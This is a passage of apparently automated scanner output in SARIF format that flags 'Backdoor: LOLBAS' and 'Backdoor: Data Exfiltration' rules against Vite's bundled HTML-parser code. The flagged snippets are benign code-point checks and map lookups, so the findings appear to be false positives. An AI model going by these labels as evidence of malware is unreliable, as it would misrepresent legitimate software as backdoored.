                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 87,
                  "endLine": 71,
                  "endColumn": 91,
                  "snippet": {
                    "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                    "rendered": {
                      "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                      "markdown": "`}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 72,
                  "endLine": 71,
                  "endColumn": 76,
                  "snippet": {
                    "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                    "rendered": {
                      "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                      "markdown": "`}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 57,
                  "endLine": 71,
                  "endColumn": 61,
                  "snippet": {
                    "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                    "rendered": {
                      "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                      "markdown": "`}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 42,
                  "endLine": 71,
                  "endColumn": 46,
                  "snippet": {
                    "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                    "rendered": {
                      "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                      "markdown": "`}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 27,
                  "endLine": 71,
                  "endColumn": 31,
                  "snippet": {
                    "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                    "rendered": {
                      "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                      "markdown": "`}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 25,
                  "endLine": 64,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n}\nfunction getSurrogatePairCodePoint(cp1, cp2) {\n    return (cp1 - 55296) * 1024 + 9216 + cp2;\n",
                    "rendered": {
                      "text": "    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n}\nfunction getSurrogatePairCodePoint(cp1, cp2) {\n    return (cp1 - 55296) * 1024 + 9216 + cp2;\n",
                      "markdown": "`    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n}\nfunction getSurrogatePairCodePoint(cp1, cp2) {\n    return (cp1 - 55296) * 1024 + 9216 + cp2;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 10,
                  "endLine": 64,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n}\nfunction getSurrogatePairCodePoint(cp1, cp2) {\n    return (cp1 - 55296) * 1024 + 9216 + cp2;\n",
                    "rendered": {
                      "text": "    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n}\nfunction getSurrogatePairCodePoint(cp1, cp2) {\n    return (cp1 - 55296) * 1024 + 9216 + cp2;\n",
                      "markdown": "`    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n}\nfunction getSurrogatePairCodePoint(cp1, cp2) {\n    return (cp1 - 55296) * 1024 + 9216 + cp2;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 25,
                  "endLine": 61,
                  "endColumn": 29,
                  "snippet": {
                    "text": "};\n//Surrogates\nfunction isSurrogate(cp) {\n    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n",
                    "rendered": {
                      "text": "};\n//Surrogates\nfunction isSurrogate(cp) {\n    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n",
                      "markdown": "`};\n//Surrogates\nfunction isSurrogate(cp) {\n    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 10,
                  "endLine": 61,
                  "endColumn": 14,
                  "snippet": {
                    "text": "};\n//Surrogates\nfunction isSurrogate(cp) {\n    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n",
                    "rendered": {
                      "text": "};\n//Surrogates\nfunction isSurrogate(cp) {\n    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n",
                      "markdown": "`};\n//Surrogates\nfunction isSurrogate(cp) {\n    return cp >= 55296 && cp <= 57343;\n}\nfunction isSurrogatePair(cp) {\n    return cp >= 56320 && cp <= 57343;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4770,
                  "startColumn": 56,
                  "endLine": 4770,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    }\n}\nfunction adjustTokenSVGTagName(token) {\n    const adjustedTagName = SVG_TAG_NAMES_ADJUSTMENT_MAP.get(token.tagName);\n    if (adjustedTagName != null) {\n        token.tagName = adjustedTagName;\n        token.tagID = getTagID(token.tagName);\n",
                    "rendered": {
                      "text": "    }\n}\nfunction adjustTokenSVGTagName(token) {\n    const adjustedTagName = SVG_TAG_NAMES_ADJUSTMENT_MAP.get(token.tagName);\n    if (adjustedTagName != null) {\n        token.tagName = adjustedTagName;\n        token.tagID = getTagID(token.tagName);\n",
                      "markdown": "`    }\n}\nfunction adjustTokenSVGTagName(token) {\n    const adjustedTagName = SVG_TAG_NAMES_ADJUSTMENT_MAP.get(token.tagName);\n    if (adjustedTagName != null) {\n        token.tagName = adjustedTagName;\n        token.tagID = getTagID(token.tagName);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4761,
                  "startColumn": 58,
                  "endLine": 4761,
                  "endColumn": 63,
                  "snippet": {
                    "text": "}\nfunction adjustTokenXMLAttrs(token) {\n    for (let i = 0; i < token.attrs.length; i++) {\n        const adjustedAttrEntry = XML_ATTRS_ADJUSTMENT_MAP.get(token.attrs[i].name);\n        if (adjustedAttrEntry) {\n            token.attrs[i].prefix = adjustedAttrEntry.prefix;\n            token.attrs[i].name = adjustedAttrEntry.name;\n",
                    "rendered": {
                      "text": "}\nfunction adjustTokenXMLAttrs(token) {\n    for (let i = 0; i < token.attrs.length; i++) {\n        const adjustedAttrEntry = XML_ATTRS_ADJUSTMENT_MAP.get(token.attrs[i].name);\n        if (adjustedAttrEntry) {\n            token.attrs[i].prefix = adjustedAttrEntry.prefix;\n            token.attrs[i].name = adjustedAttrEntry.name;\n",
                      "markdown": "`}\nfunction adjustTokenXMLAttrs(token) {\n    for (let i = 0; i < token.attrs.length; i++) {\n        const adjustedAttrEntry = XML_ATTRS_ADJUSTMENT_MAP.get(token.attrs[i].name);\n        if (adjustedAttrEntry) {\n            token.attrs[i].prefix = adjustedAttrEntry.prefix;\n            token.attrs[i].name = adjustedAttrEntry.name;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4753,
                  "startColumn": 57,
                  "endLine": 4753,
                  "endColumn": 62,
                  "snippet": {
                    "text": "}\nfunction adjustTokenSVGAttrs(token) {\n    for (let i = 0; i < token.attrs.length; i++) {\n        const adjustedAttrName = SVG_ATTRS_ADJUSTMENT_MAP.get(token.attrs[i].name);\n        if (adjustedAttrName != null) {\n            token.attrs[i].name = adjustedAttrName;\n        }\n",
                    "rendered": {
                      "text": "}\nfunction adjustTokenSVGAttrs(token) {\n    for (let i = 0; i < token.attrs.length; i++) {\n        const adjustedAttrName = SVG_ATTRS_ADJUSTMENT_MAP.get(token.attrs[i].name);\n        if (adjustedAttrName != null) {\n            token.attrs[i].name = adjustedAttrName;\n        }\n",
                      "markdown": "`}\nfunction adjustTokenSVGAttrs(token) {\n    for (let i = 0; i < token.attrs.length; i++) {\n        const adjustedAttrName = SVG_ATTRS_ADJUSTMENT_MAP.get(token.attrs[i].name);\n        if (adjustedAttrName != null) {\n            token.attrs[i].name = adjustedAttrName;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4222,
                  "startColumn": 59,
                  "endLine": 4222,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        for (let i = 0; i < candidates.length; i++) {\n            const candidate = candidates[i];\n            // We know that `candidate.attrs.length === neAttrs.length`\n            if (candidate.attrs.every((cAttr) => neAttrsMap.get(cAttr.name) === cAttr.value)) {\n                validCandidates += 1;\n                if (validCandidates >= NOAH_ARK_CAPACITY) {\n                    this.entries.splice(candidate.idx, 1);\n",
                    "rendered": {
                      "text": "        for (let i = 0; i < candidates.length; i++) {\n            const candidate = candidates[i];\n            // We know that `candidate.attrs.length === neAttrs.length`\n            if (candidate.attrs.every((cAttr) => neAttrsMap.get(cAttr.name) === cAttr.value)) {\n                validCandidates += 1;\n                if (validCandidates >= NOAH_ARK_CAPACITY) {\n                    this.entries.splice(candidate.idx, 1);\n",
                      "markdown": "`        for (let i = 0; i < candidates.length; i++) {\n            const candidate = candidates[i];\n            // We know that `candidate.attrs.length === neAttrs.length`\n            if (candidate.attrs.every((cAttr) => neAttrsMap.get(cAttr.name) === cAttr.value)) {\n                validCandidates += 1;\n                if (validCandidates >= NOAH_ARK_CAPACITY) {\n                    this.entries.splice(candidate.idx, 1);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4097,
                  "startColumn": 78,
                  "endLine": 4097,
                  "endColumn": 83,
                  "snippet": {
                    "text": "            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if ((tn === TAG_ID.BUTTON && ns === NS.HTML) || SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                    "rendered": {
                      "text": "            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if ((tn === TAG_ID.BUTTON && ns === NS.HTML) || SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                      "markdown": "`            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if ((tn === TAG_ID.BUTTON && ns === NS.HTML) || SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4084,
                  "startColumn": 96,
                  "endLine": 4084,
                  "endColumn": 101,
                  "snippet": {
                    "text": "            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if (((tn === TAG_ID.UL || tn === TAG_ID.OL) && ns === NS.HTML) || SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                    "rendered": {
                      "text": "            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if (((tn === TAG_ID.UL || tn === TAG_ID.OL) && ns === NS.HTML) || SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                      "markdown": "`            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if (((tn === TAG_ID.UL || tn === TAG_ID.OL) && ns === NS.HTML) || SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4071,
                  "startColumn": 34,
                  "endLine": 4071,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            if (isNumberedHeader(tn) && ns === NS.HTML) {\n                return true;\n            }\n            if (SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                    "rendered": {
                      "text": "            if (isNumberedHeader(tn) && ns === NS.HTML) {\n                return true;\n            }\n            if (SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                      "markdown": "`            if (isNumberedHeader(tn) && ns === NS.HTML) {\n                return true;\n            }\n            if (SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4058,
                  "startColumn": 34,
                  "endLine": 4058,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if (SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                    "rendered": {
                      "text": "            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if (SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n",
                      "markdown": "`            if (tn === tagName && ns === NS.HTML) {\n                return true;\n            }\n            if (SCOPING_ELEMENT_NS.get(tn) === ns) {\n                return false;\n            }\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 3848,
                  "startColumn": 66,
                  "endLine": 3848,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        }\n        else if (isControlCodePoint(this.charRefCode) || this.charRefCode === CODE_POINTS.CARRIAGE_RETURN) {\n            this._err(ERR.controlCharacterReference);\n            const replacement = C1_CONTROLS_REFERENCE_REPLACEMENTS.get(this.charRefCode);\n            if (replacement !== undefined) {\n                this.charRefCode = replacement;\n            }\n",
                    "rendered": {
                      "text": "        }\n        else if (isControlCodePoint(this.charRefCode) || this.charRefCode === CODE_POINTS.CARRIAGE_RETURN) {\n            this._err(ERR.controlCharacterReference);\n            const replacement = C1_CONTROLS_REFERENCE_REPLACEMENTS.get(this.charRefCode);\n            if (replacement !== undefined) {\n                this.charRefCode = replacement;\n            }\n",
                      "markdown": "`        }\n        else if (isControlCodePoint(this.charRefCode) || this.charRefCode === CODE_POINTS.CARRIAGE_RETURN) {\n            this._err(ERR.controlCharacterReference);\n            const replacement = C1_CONTROLS_REFERENCE_REPLACEMENTS.get(this.charRefCode);\n            if (replacement !== undefined) {\n                this.charRefCode = replacement;\n            }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 866,
                  "startColumn": 31,
                  "endLine": 866,
                  "endColumn": 36,
                  "snippet": {
                    "text": "]);\nfunction getTagID(tagName) {\n    var _a;\n    return (_a = TAG_NAME_TO_ID.get(tagName)) !== null && _a !== void 0 ? _a : TAG_ID.UNKNOWN;\n}\nconst $ = TAG_ID;\nconst SPECIAL_ELEMENTS = {\n",
                    "rendered": {
                      "text": "]);\nfunction getTagID(tagName) {\n    var _a;\n    return (_a = TAG_NAME_TO_ID.get(tagName)) !== null && _a !== void 0 ? _a : TAG_ID.UNKNOWN;\n}\nconst $ = TAG_ID;\nconst SPECIAL_ELEMENTS = {\n",
                      "markdown": "`]);\nfunction getTagID(tagName) {\n    var _a;\n    return (_a = TAG_NAME_TO_ID.get(tagName)) !== null && _a !== void 0 ? _a : TAG_ID.UNKNOWN;\n}\nconst $ = TAG_ID;\nconst SPECIAL_ELEMENTS = {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/constants.js"
                },
                "region": {
                  "startLine": 112,
                  "startColumn": 236,
                  "endLine": 112,
                  "endColumn": 286,
                  "snippet": {
                    "text": "const DEFAULT_ASSETS_INLINE_LIMIT = 4096;\nconst METADATA_FILENAME = \"_metadata.json\";\n\nexport { CLIENT_DIR, CLIENT_ENTRY, CLIENT_PUBLIC_PATH, CSS_LANGS_RE, DEFAULT_ASSETS_INLINE_LIMIT, DEFAULT_ASSETS_RE, DEFAULT_CONFIG_FILES, DEFAULT_DEV_PORT, DEFAULT_EXTENSIONS, DEFAULT_MAIN_FIELDS, DEFAULT_PREVIEW_PORT, DEP_VERSION_RE, ENV_ENTRY, ENV_PUBLIC_PATH, ESBUILD_MODULES_TARGET, FS_PREFIX, JS_TYPES_RE, KNOWN_ASSET_TYPES, METADATA_FILENAME, OPTIMIZABLE_ENTRY_RE, SPECIAL_QUERY_RE, VERSION, VITE_PACKAGE_DIR, loopbackHosts, wildcardHosts };\n",
                    "rendered": {
